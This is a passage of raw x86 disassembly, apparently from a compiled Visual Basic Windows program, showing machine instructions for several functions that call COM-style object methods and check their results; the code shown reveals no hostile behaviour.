  40402e:	89 45 8c             	mov    %eax,-0x74(%ebp)
  404031:	8b 06                	mov    (%esi),%eax
  404033:	56                   	push   %esi
  404034:	ff 90 08 03 00 00    	call   *0x308(%eax)
  40403a:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40403d:	50                   	push   %eax
  40403e:	51                   	push   %ecx
  40403f:	ff d3                	call   *%ebx
  404041:	8b d8                	mov    %eax,%ebx
  404043:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404046:	50                   	push   %eax
  404047:	53                   	push   %ebx
  404048:	8b 13                	mov    (%ebx),%edx
  40404a:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404050:	3b c7                	cmp    %edi,%eax
  404052:	db e2                	fnclex
  404054:	7d 12                	jge    0x404068
  404056:	68 a0 00 00 00       	push   $0xa0
  40405b:	68 84 2a 40 00       	push   $0x402a84
  404060:	53                   	push   %ebx
  404061:	50                   	push   %eax
  404062:	ff 15 38 10 40 00    	call   *0x401038
  404068:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  40406b:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40406e:	52                   	push   %edx
  40406f:	8b 19                	mov    (%ecx),%ebx
  404071:	e8 3a f0 ff ff       	call   0x4030b0
  404076:	8b d0                	mov    %eax,%edx
  404078:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40407b:	ff 15 f0 10 40 00    	call   *0x4010f0
  404081:	89 9d 7c ff ff ff    	mov    %ebx,-0x84(%ebp)
  404087:	8b 5d 8c             	mov    -0x74(%ebp),%ebx
  40408a:	50                   	push   %eax
  40408b:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  404091:	53                   	push   %ebx
  404092:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  404098:	3b c7                	cmp    %edi,%eax
  40409a:	db e2                	fnclex
  40409c:	7d 12                	jge    0x4040b0
  40409e:	68 a4 00 00 00       	push   $0xa4
  4040a3:	68 84 2a 40 00       	push   $0x402a84
  4040a8:	53                   	push   %ebx
  4040a9:	50                   	push   %eax
  4040aa:	ff 15 38 10 40 00    	call   *0x401038
  4040b0:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4040b3:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  4040b6:	51                   	push   %ecx
  4040b7:	52                   	push   %edx
  4040b8:	6a 02                	push   $0x2
  4040ba:	ff 15 d0 10 40 00    	call   *0x4010d0
  4040c0:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4040c3:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4040c6:	50                   	push   %eax
  4040c7:	51                   	push   %ecx
  4040c8:	6a 02                	push   $0x2
  4040ca:	ff 15 24 10 40 00    	call   *0x401024
  4040d0:	83 c4 18             	add    $0x18,%esp
  4040d3:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  4040d6:	57                   	push   %edi
  4040d7:	57                   	push   %edi
  4040d8:	57                   	push   %edi
  4040d9:	57                   	push   %edi
  4040da:	8b 3d e4 10 40 00    	mov    0x4010e4,%edi
  4040e0:	68 84 22 40 00       	push   $0x402284
  4040e5:	52                   	push   %edx
  4040e6:	ff d7                	call   *%edi
  4040e8:	50                   	push   %eax
  4040e9:	e8 d2 e6 ff ff       	call   0x4027c0
  4040ee:	8b 1d 34 10 40 00    	mov    0x401034,%ebx
  4040f4:	89 45 98             	mov    %eax,-0x68(%ebp)
  4040f7:	ff d3                	call   *%ebx
  4040f9:	8b 45 98             	mov    -0x68(%ebp),%eax
  4040fc:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4040ff:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404102:	ff 15 08 11 40 00    	call   *0x401108
  404108:	6a 00                	push   $0x0
  40410a:	6a 00                	push   $0x0
  40410c:	6a 03                	push   $0x3
  40410e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404111:	68 84 23 40 00       	push   $0x402384
  404116:	51                   	push   %ecx
  404117:	ff d7                	call   *%edi
  404119:	50                   	push   %eax
  40411a:	8d 55 c0             	lea    -0x40(%ebp),%edx
  40411d:	68 84 23 40 00       	push   $0x402384
  404122:	52                   	push   %edx
  404123:	ff d7                	call   *%edi
  404125:	50                   	push   %eax
  404126:	6a 50                	push   $0x50
  404128:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40412b:	68 3c 22 40 00       	push   $0x40223c
  404130:	50                   	push   %eax
  404131:	ff d7                	call   *%edi
  404133:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  404136:	50                   	push   %eax
  404137:	51                   	push   %ecx
  404138:	e8 43 e7 ff ff       	call   0x402880
  40413d:	89 45 98             	mov    %eax,-0x68(%ebp)
  404140:	ff d3                	call   *%ebx
  404142:	8b 55 98             	mov    -0x68(%ebp),%edx
  404145:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404148:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40414b:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40414e:	50                   	push   %eax
  40414f:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  404152:	51                   	push   %ecx
  404153:	52                   	push   %edx
  404154:	6a 03                	push   $0x3
  404156:	ff 15 d0 10 40 00    	call   *0x4010d0
  40415c:	8b 06                	mov    (%esi),%eax
  40415e:	83 c4 10             	add    $0x10,%esp
  404161:	56                   	push   %esi
  404162:	ff 90 fc 02 00 00    	call   *0x2fc(%eax)
  404168:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40416b:	50                   	push   %eax
  40416c:	51                   	push   %ecx
  40416d:	ff 15 48 10 40 00    	call   *0x401048
  404173:	8b 10                	mov    (%eax),%edx
  404175:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404178:	51                   	push   %ecx
  404179:	50                   	push   %eax
  40417a:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40417d:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404183:	db e2                	fnclex
  404185:	85 c0                	test   %eax,%eax
  404187:	7d 15                	jge    0x40419e
  404189:	8b 55 94             	mov    -0x6c(%ebp),%edx
  40418c:	68 a0 00 00 00       	push   $0xa0
  404191:	68 84 2a 40 00       	push   $0x402a84
  404196:	52                   	push   %edx
  404197:	50                   	push   %eax
  404198:	ff 15 38 10 40 00    	call   *0x401038
  40419e:	6a 00                	push   $0x0
  4041a0:	68 00 00 00 80       	push   $0x80000000
  4041a5:	6a 00                	push   $0x0
  4041a7:	6a 00                	push   $0x0
  4041a9:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4041ac:	68 04 2b 40 00       	push   $0x402b04
  4041b1:	50                   	push   %eax
  4041b2:	ff d7                	call   *%edi
  4041b4:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4041b7:	50                   	push   %eax
  4041b8:	68 a4 2a 40 00       	push   $0x402aa4
  4041bd:	51                   	push   %ecx
  4041be:	ff 15 30 10 40 00    	call   *0x401030
  4041c4:	8b d0                	mov    %eax,%edx
  4041c6:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4041c9:	ff 15 f0 10 40 00    	call   *0x4010f0
  4041cf:	50                   	push   %eax
  4041d0:	68 ec 2a 40 00       	push   $0x402aec
  4041d5:	ff 15 30 10 40 00    	call   *0x401030
  4041db:	8b d0                	mov    %eax,%edx
  4041dd:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4041e0:	ff 15 f0 10 40 00    	call   *0x4010f0
  4041e6:	8b 56 38             	mov    0x38(%esi),%edx
  4041e9:	50                   	push   %eax
  4041ea:	52                   	push   %edx
  4041eb:	ff 15 30 10 40 00    	call   *0x401030
  4041f1:	8b d0                	mov    %eax,%edx
  4041f3:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4041f6:	ff 15 f0 10 40 00    	call   *0x4010f0
  4041fc:	50                   	push   %eax
  4041fd:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404200:	50                   	push   %eax
  404201:	ff d7                	call   *%edi
  404203:	50                   	push   %eax
  404204:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404207:	68 98 2a 40 00       	push   $0x402a98
  40420c:	51                   	push   %ecx
  40420d:	ff d7                	call   *%edi
  40420f:	8b 55 98             	mov    -0x68(%ebp),%edx
  404212:	50                   	push   %eax
  404213:	52                   	push   %edx
  404214:	e8 b3 e6 ff ff       	call   0x4028cc
  404219:	8b f8                	mov    %eax,%edi
  40421b:	ff d3                	call   *%ebx
  40421d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404220:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404223:	50                   	push   %eax
  404224:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  404227:	51                   	push   %ecx
  404228:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40422b:	52                   	push   %edx
  40422c:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40422f:	50                   	push   %eax
  404230:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404233:	51                   	push   %ecx
  404234:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404237:	52                   	push   %edx
  404238:	50                   	push   %eax
  404239:	6a 07                	push   $0x7
  40423b:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40423e:	ff 15 d0 10 40 00    	call   *0x4010d0
  404244:	83 c4 20             	add    $0x20,%esp
  404247:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40424a:	ff 15 0c 11 40 00    	call   *0x40110c
  404250:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  404253:	6a 00                	push   $0x0
  404255:	51                   	push   %ecx
  404256:	6a 00                	push   $0x0
  404258:	6a 00                	push   $0x0
  40425a:	57                   	push   %edi
  40425b:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%ebp)
  404262:	e8 b1 e6 ff ff       	call   0x402918
  404267:	8b f8                	mov    %eax,%edi
  404269:	ff d3                	call   *%ebx
  40426b:	0f bf c7             	movswl %di,%eax
  40426e:	85 c0                	test   %eax,%eax
  404270:	0f 84 88 00 00 00    	je     0x4042fe
  404276:	8b 16                	mov    (%esi),%edx
  404278:	56                   	push   %esi
  404279:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40427f:	50                   	push   %eax
  404280:	8d 45 a8             	lea    -0x58(%ebp),%eax
  404283:	50                   	push   %eax
  404284:	ff 15 48 10 40 00    	call   *0x401048
  40428a:	8b f8                	mov    %eax,%edi
  40428c:	68 84 23 40 00       	push   $0x402384
  404291:	57                   	push   %edi
  404292:	8b 0f                	mov    (%edi),%ecx
  404294:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  40429a:	85 c0                	test   %eax,%eax
  40429c:	db e2                	fnclex
  40429e:	7d 12                	jge    0x4042b2
  4042a0:	68 a4 00 00 00       	push   $0xa4
  4042a5:	68 84 2a 40 00       	push   $0x402a84
  4042aa:	57                   	push   %edi
  4042ab:	50                   	push   %eax
  4042ac:	ff 15 38 10 40 00    	call   *0x401038
  4042b2:	8b 3d 0c 11 40 00    	mov    0x40110c,%edi
  4042b8:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4042bb:	ff d7                	call   *%edi
  4042bd:	8b 16                	mov    (%esi),%edx
  4042bf:	56                   	push   %esi
  4042c0:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  4042c6:	50                   	push   %eax
  4042c7:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4042ca:	50                   	push   %eax
  4042cb:	ff 15 48 10 40 00    	call   *0x401048
  4042d1:	8b f0                	mov    %eax,%esi
  4042d3:	68 84 23 40 00       	push   $0x402384
  4042d8:	56                   	push   %esi
  4042d9:	8b 0e                	mov    (%esi),%ecx
  4042db:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  4042e1:	85 c0                	test   %eax,%eax
  4042e3:	db e2                	fnclex
  4042e5:	7d 12                	jge    0x4042f9
  4042e7:	68 a4 00 00 00       	push   $0xa4
  4042ec:	68 84 2a 40 00       	push   $0x402a84
  4042f1:	56                   	push   %esi
  4042f2:	50                   	push   %eax
  4042f3:	ff 15 38 10 40 00    	call   *0x401038
  4042f9:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4042fc:	ff d7                	call   *%edi
  4042fe:	33 ff                	xor    %edi,%edi
  404300:	8b 55 d0             	mov    -0x30(%ebp),%edx
  404303:	52                   	push   %edx
  404304:	e8 03 e5 ff ff       	call   0x40280c
  404309:	ff d3                	call   *%ebx
  40430b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40430e:	50                   	push   %eax
  40430f:	e8 f8 e4 ff ff       	call   0x40280c
  404314:	ff d3                	call   *%ebx
  404316:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404319:	51                   	push   %ecx
  40431a:	e8 ed e4 ff ff       	call   0x40280c
  40431f:	ff d3                	call   *%ebx
  404321:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404324:	68 6c 43 40 00       	push   $0x40436c
  404329:	eb 40                	jmp    0x40436b
  40432b:	8b 1d 34 10 40 00    	mov    0x401034,%ebx
  404331:	eb cd                	jmp    0x404300
  404333:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404336:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404339:	52                   	push   %edx
  40433a:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40433d:	50                   	push   %eax
  40433e:	8d 55 b8             	lea    -0x48(%ebp),%edx
  404341:	51                   	push   %ecx
  404342:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404345:	52                   	push   %edx
  404346:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404349:	50                   	push   %eax
  40434a:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  40434d:	51                   	push   %ecx
  40434e:	52                   	push   %edx
  40434f:	6a 07                	push   $0x7
  404351:	ff 15 d0 10 40 00    	call   *0x4010d0
  404357:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40435a:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40435d:	50                   	push   %eax
  40435e:	51                   	push   %ecx
  40435f:	6a 02                	push   $0x2
  404361:	ff 15 24 10 40 00    	call   *0x401024
  404367:	83 c4 2c             	add    $0x2c,%esp
  40436a:	c3                   	ret
  40436b:	c3                   	ret
  40436c:	8b 45 08             	mov    0x8(%ebp),%eax
  40436f:	50                   	push   %eax
  404370:	8b 10                	mov    (%eax),%edx
  404372:	ff 52 08             	call   *0x8(%edx)
  404375:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404378:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40437b:	5f                   	pop    %edi
  40437c:	5e                   	pop    %esi
  40437d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404384:	5b                   	pop    %ebx
  404385:	8b e5                	mov    %ebp,%esp
  404387:	5d                   	pop    %ebp
  404388:	c2 04 00             	ret    $0x4
  40438b:	90                   	nop
  40438c:	90                   	nop
  40438d:	90                   	nop
  40438e:	90                   	nop
  40438f:	90                   	nop
  404390:	55                   	push   %ebp
  404391:	8b ec                	mov    %esp,%ebp
  404393:	83 ec 0c             	sub    $0xc,%esp
  404396:	68 c6 11 40 00       	push   $0x4011c6
  40439b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4043a1:	50                   	push   %eax
  4043a2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4043a9:	83 ec 24             	sub    $0x24,%esp
  4043ac:	53                   	push   %ebx
  4043ad:	56                   	push   %esi
  4043ae:	57                   	push   %edi
  4043af:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4043b2:	c7 45 f8 88 11 40 00 	movl   $0x401188,-0x8(%ebp)
  4043b9:	8b 75 08             	mov    0x8(%ebp),%esi
  4043bc:	8b c6                	mov    %esi,%eax
  4043be:	83 e0 01             	and    $0x1,%eax
  4043c1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4043c4:	83 e6 fe             	and    $0xfffffffe,%esi
  4043c7:	56                   	push   %esi
  4043c8:	89 75 08             	mov    %esi,0x8(%ebp)
  4043cb:	8b 0e                	mov    (%esi),%ecx
  4043cd:	ff 51 04             	call   *0x4(%ecx)
  4043d0:	8b 16                	mov    (%esi),%edx
  4043d2:	33 c0                	xor    %eax,%eax
  4043d4:	56                   	push   %esi
  4043d5:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4043d8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4043db:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4043de:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4043e4:	8b 1d 48 10 40 00    	mov    0x401048,%ebx
  4043ea:	50                   	push   %eax
  4043eb:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4043ee:	50                   	push   %eax
  4043ef:	ff d3                	call   *%ebx
  4043f1:	8b f8                	mov    %eax,%edi
  4043f3:	6a 00                	push   $0x0
  4043f5:	57                   	push   %edi
  4043f6:	8b 0f                	mov    (%edi),%ecx
  4043f8:	ff 91 14 01 00 00    	call   *0x114(%ecx)
  4043fe:	85 c0                	test   %eax,%eax
  404400:	db e2                	fnclex
  404402:	7d 12                	jge    0x404416
  404404:	68 14 01 00 00       	push   $0x114
  404409:	68 84 2a 40 00       	push   $0x402a84
  40440e:	57                   	push   %edi
  40440f:	50                   	push   %eax
  404410:	ff 15 38 10 40 00    	call   *0x401038
  404416:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  404419:	ff 15 0c 11 40 00    	call   *0x40110c
  40441f:	8b 16                	mov    (%esi),%edx
  404421:	56                   	push   %esi
  404422:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404428:	50                   	push   %eax
  404429:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40442c:	50                   	push   %eax
  40442d:	ff d3                	call   *%ebx
  40442f:	8b 0e                	mov    (%esi),%ecx
  404431:	56                   	push   %esi
  404432:	8b f8                	mov    %eax,%edi
  404434:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40443a:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40443d:	50                   	push   %eax
  40443e:	52                   	push   %edx
  40443f:	ff d3                	call   *%ebx
  404441:	8b f0                	mov    %eax,%esi
  404443:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404446:	51                   	push   %ecx
  404447:	56                   	push   %esi
  404448:	8b 06                	mov    (%esi),%eax
  40444a:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  404450:	85 c0                	test   %eax,%eax
  404452:	db e2                	fnclex
  404454:	7d 12                	jge    0x404468
  404456:	68 a0 00 00 00       	push   $0xa0
  40445b:	68 84 2a 40 00       	push   $0x402a84
  404460:	56                   	push   %esi
  404461:	50                   	push   %eax
  404462:	ff 15 38 10 40 00    	call   *0x401038
  404468:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40446b:	8b 37                	mov    (%edi),%esi
  40446d:	52                   	push   %edx
  40446e:	ff 15 14 10 40 00    	call   *0x401014
  404474:	50                   	push   %eax
  404475:	57                   	push   %edi
  404476:	ff 96 1c 01 00 00    	call   *0x11c(%esi)
  40447c:	85 c0                	test   %eax,%eax
  40447e:	db e2                	fnclex
  404480:	7d 12                	jge    0x404494
  404482:	68 1c 01 00 00       	push   $0x11c
  404487:	68 84 2a 40 00       	push   $0x402a84
  40448c:	57                   	push   %edi
  40448d:	50                   	push   %eax
  40448e:	ff 15 38 10 40 00    	call   *0x401038
  404494:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404497:	ff 15 08 11 40 00    	call   *0x401108
  40449d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4044a0:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4044a3:	50                   	push   %eax
  4044a4:	51                   	push   %ecx
  4044a5:	6a 02                	push   $0x2
  4044a7:	ff 15 24 10 40 00    	call   *0x401024
  4044ad:	83 c4 0c             	add    $0xc,%esp
  4044b0:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4044b7:	68 dc 44 40 00       	push   $0x4044dc
  4044bc:	eb 1d                	jmp    0x4044db
  4044be:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4044c1:	ff 15 08 11 40 00    	call   *0x401108
  4044c7:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4044ca:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4044cd:	52                   	push   %edx
  4044ce:	50                   	push   %eax
  4044cf:	6a 02                	push   $0x2
  4044d1:	ff 15 24 10 40 00    	call   *0x401024
  4044d7:	83 c4 0c             	add    $0xc,%esp
  4044da:	c3                   	ret
  4044db:	c3                   	ret
  4044dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4044df:	50                   	push   %eax
  4044e0:	8b 08                	mov    (%eax),%ecx
  4044e2:	ff 51 08             	call   *0x8(%ecx)
  4044e5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044e8:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4044eb:	5f                   	pop    %edi
  4044ec:	5e                   	pop    %esi
  4044ed:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4044f4:	5b                   	pop    %ebx
  4044f5:	8b e5                	mov    %ebp,%esp
  4044f7:	5d                   	pop    %ebp
  4044f8:	c2 04 00             	ret    $0x4
  4044fb:	90                   	nop
  4044fc:	90                   	nop
  4044fd:	90                   	nop
  4044fe:	90                   	nop
  4044ff:	90                   	nop
  404500:	55                   	push   %ebp
  404501:	8b ec                	mov    %esp,%ebp
  404503:	83 ec 0c             	sub    $0xc,%esp
  404506:	68 c6 11 40 00       	push   $0x4011c6
  40450b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404511:	50                   	push   %eax
  404512:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404519:	83 ec 24             	sub    $0x24,%esp
  40451c:	53                   	push   %ebx
  40451d:	56                   	push   %esi
  40451e:	57                   	push   %edi
  40451f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  404522:	c7 45 f8 98 11 40 00 	movl   $0x401198,-0x8(%ebp)
  404529:	8b 75 08             	mov    0x8(%ebp),%esi
  40452c:	8b c6                	mov    %esi,%eax
  40452e:	83 e0 01             	and    $0x1,%eax
  404531:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404534:	83 e6 fe             	and    $0xfffffffe,%esi
  404537:	56                   	push   %esi
  404538:	89 75 08             	mov    %esi,0x8(%ebp)
  40453b:	8b 0e                	mov    (%esi),%ecx
  40453d:	ff 51 04             	call   *0x4(%ecx)
  404540:	8b 16                	mov    (%esi),%edx
  404542:	33 c0                	xor    %eax,%eax
  404544:	56                   	push   %esi
  404545:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404548:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40454b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40454e:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  404554:	8b 1d 48 10 40 00    	mov    0x401048,%ebx
  40455a:	50                   	push   %eax
  40455b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40455e:	50                   	push   %eax
  40455f:	ff d3                	call   *%ebx
  404561:	8b f8                	mov    %eax,%edi
  404563:	6a 00                	push   $0x0
  404565:	57                   	push   %edi
  404566:	8b 0f                	mov    (%edi),%ecx
  404568:	ff 91 14 01 00 00    	call   *0x114(%ecx)
  40456e:	85 c0                	test   %eax,%eax
  404570:	db e2                	fnclex
  404572:	7d 12                	jge    0x404586
  404574:	68 14 01 00 00       	push   $0x114
  404579:	68 84 2a 40 00       	push   $0x402a84
  40457e:	57                   	push   %edi
  40457f:	50                   	push   %eax
  404580:	ff 15 38 10 40 00    	call   *0x401038
  404586:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  404589:	ff 15 0c 11 40 00    	call   *0x40110c
  40458f:	8b 16                	mov    (%esi),%edx
  404591:	56                   	push   %esi
  404592:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  404598:	50                   	push   %eax
  404599:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40459c:	50                   	push   %eax
  40459d:	ff d3                	call   *%ebx
  40459f:	8b 0e                	mov    (%esi),%ecx
  4045a1:	56                   	push   %esi
  4045a2:	8b f8                	mov    %eax,%edi
  4045a4:	ff 91 fc 02 00 00    	call   *0x2fc(%ecx)
  4045aa:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4045ad:	50                   	push   %eax
  4045ae:	52                   	push   %edx
  4045af:	ff d3                	call   *%ebx
  4045b1:	8b f0                	mov    %eax,%esi
  4045b3:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4045b6:	51                   	push   %ecx
  4045b7:	56                   	push   %esi
  4045b8:	8b 06                	mov    (%esi),%eax
  4045ba:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4045c0:	85 c0                	test   %eax,%eax
  4045c2:	db e2                	fnclex
  4045c4:	7d 12                	jge    0x4045d8
  4045c6:	68 a0 00 00 00       	push   $0xa0
  4045cb:	68 84 2a 40 00       	push   $0x402a84
  4045d0:	56                   	push   %esi
  4045d1:	50                   	push   %eax
  4045d2:	ff 15 38 10 40 00    	call   *0x401038
  4045d8:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4045db:	8b 37                	mov    (%edi),%esi
  4045dd:	52                   	push   %edx
  4045de:	ff 15 14 10 40 00    	call   *0x401014
  4045e4:	50                   	push   %eax
  4045e5:	57                   	push   %edi
  4045e6:	ff 96 1c 01 00 00    	call   *0x11c(%esi)
  4045ec:	85 c0                	test   %eax,%eax
  4045ee:	db e2                	fnclex
  4045f0:	7d 12                	jge    0x404604
  4045f2:	68 1c 01 00 00       	push   $0x11c
  4045f7:	68 84 2a 40 00       	push   $0x402a84
  4045fc:	57                   	push   %edi
  4045fd:	50                   	push   %eax
  4045fe:	ff 15 38 10 40 00    	call   *0x401038
  404604:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404607:	ff 15 08 11 40 00    	call   *0x401108
  40460d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404610:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  404613:	50                   	push   %eax
  404614:	51                   	push   %ecx
  404615:	6a 02                	push   $0x2
  404617:	ff 15 24 10 40 00    	call   *0x401024
  40461d:	83 c4 0c             	add    $0xc,%esp
  404620:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404627:	68 4c 46 40 00       	push   $0x40464c
  40462c:	eb 1d                	jmp    0x40464b
  40462e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404631:	ff 15 08 11 40 00    	call   *0x401108
  404637:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40463a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40463d:	52                   	push   %edx
  40463e:	50                   	push   %eax
  40463f:	6a 02                	push   $0x2
  404641:	ff 15 24 10 40 00    	call   *0x401024
  404647:	83 c4 0c             	add    $0xc,%esp
  40464a:	c3                   	ret
  40464b:	c3                   	ret
  40464c:	8b 45 08             	mov    0x8(%ebp),%eax
  40464f:	50                   	push   %eax
  404650:	8b 08                	mov    (%eax),%ecx
  404652:	ff 51 08             	call   *0x8(%ecx)
  404655:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404658:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40465b:	5f                   	pop    %edi
  40465c:	5e                   	pop    %esi
  40465d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404664:	5b                   	pop    %ebx
  404665:	8b e5                	mov    %ebp,%esp
  404667:	5d                   	pop    %ebp
  404668:	c2 04 00             	ret    $0x4
  40466b:	90                   	nop
  40466c:	90                   	nop
  40466d:	90                   	nop
  40466e:	90                   	nop
  40466f:	90                   	nop
  404670:	55                   	push   %ebp
  404671:	8b ec                	mov    %esp,%ebp
  404673:	83 ec 0c             	sub    $0xc,%esp
  404676:	68 c6 11 40 00       	push   $0x4011c6
  40467b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404681:	50                   	push   %eax
  404682:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404689:	81 ec fc 01 00 00    	sub    $0x1fc,%esp
  40468f:	53                   	push   %ebx
  404690:	56                   	push   %esi
  404691:	57                   	push   %edi
  404692:	89 65 f4             	mov    %esp,-0xc(%ebp)
  404695:	c7 45 f8 a8 11 40 00 	movl   $0x4011a8,-0x8(%ebp)
  40469c:	8b 75 08             	mov    0x8(%ebp),%esi
  40469f:	8b c6                	mov    %esi,%eax
  4046a1:	83 e0 01             	and    $0x1,%eax
  4046a4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4046a7:	83 e6 fe             	and    $0xfffffffe,%esi
  4046aa:	56                   	push   %esi
  4046ab:	89 75 08             	mov    %esi,0x8(%ebp)
  4046ae:	8b 0e                	mov    (%esi),%ecx
  4046b0:	ff 51 04             	call   *0x4(%ecx)
  4046b3:	8b 1d 48 10 40 00    	mov    0x401048,%ebx
  4046b9:	33 c0                	xor    %eax,%eax
  4046bb:	b9 41 00 00 00       	mov    $0x41,%ecx
  4046c0:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4046c3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4046c6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4046c9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4046cc:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4046cf:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4046d2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  4046d5:	89 45 90             	mov    %eax,-0x70(%ebp)
  4046d8:	89 45 80             	mov    %eax,-0x80(%ebp)
  4046db:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  4046e1:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
